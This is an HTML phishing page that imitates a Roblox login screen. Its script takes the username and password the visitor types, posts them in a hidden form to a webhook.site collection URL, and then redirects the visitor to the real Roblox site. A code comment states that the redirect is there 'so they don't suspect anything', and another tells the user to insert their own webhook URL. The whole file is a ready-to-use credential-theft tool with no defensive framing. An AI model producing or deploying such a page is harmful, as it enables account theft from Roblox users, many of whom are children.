<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Login</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f0f0; }
        .container { text-align: center; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 300px; }
        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { width: 100%; padding: 10px; background: #00b06f; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background: #009a5e; }
    </style>
</head>
<body>

<div class="container">
    <h2>Log In</h2>
    <input type="text" id="username" placeholder="Username" required>
    <input type="password" id="password" placeholder="Password" required>
    <button id="loginBtn">Log In</button>
</div>

<script>
    // REPLACE THIS WITH YOUR WEBHOOK.SITE URL
    const WEBHOOK_SITE_URL = "https://webhook.site/3f899a22-0936-4f05-827f-8e24d5d0dcc1";

    document.getElementById('loginBtn').addEventListener('click', function() {
       
        // 1. Get the values they typed
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        // 2. Create a hidden form
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = WEBHOOK_SITE_URL;

        // 3. Add the username and password as fields
        const userField = document.createElement('input');
        userField.type = 'hidden';
        userField.name = 'username';
        userField.value = username;
        form.appendChild(userField);

        const passField = document.createElement('input');
        passField.type = 'hidden';
        passField.name = 'password';
        passField.value = password;
        form.appendChild(passField);

        // 4. Append the form to the body and submit it
        document.body.appendChild(form);
        form.submit();

        // 5. Redirect them to Roblox so they don't suspect anything
        window.location.href = "https://www.roblox.com/home";
    });
</script>

</body>
</html>
